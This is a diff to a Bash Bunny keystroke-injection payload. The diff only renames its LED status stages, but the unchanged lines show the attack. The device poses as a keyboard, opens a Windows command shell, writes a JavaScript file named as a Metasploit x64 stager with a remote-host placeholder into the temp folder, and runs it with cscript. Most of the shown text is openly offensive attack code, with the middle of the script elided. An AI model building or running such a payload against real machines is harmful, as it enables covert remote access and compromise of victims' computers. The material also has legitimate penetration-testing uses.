@@ -1,5 +1,5 @@
 REM Start exploit, going green
-LED G
+LED SETUP
 REM set attackmode to HID device
 ATTACKMODE HID
 REM set keyboard
@@ -9,6 +9,7 @@ Q DELAY 1000
 REM launch command shell, obvious for testing
 Q STRING "cmd"
 Q ENTER
+LED STAGE1
 REM Change IPADDR and PORT to match your system
 Q STRING "echo var RHOST = 'CHANGEME'; > %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
@@ -66,10 +67,10 @@ Q STRING "echo     WScript.Echo(e.message); >> %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
 Q STRING "echo } >> %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
-LED R
+LED STAGE2
 Q DELAY 1000
 Q STRING "cscript.exe %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
-LED B
+LED FINISH
 Q DELAY 1000
 shutdown 0
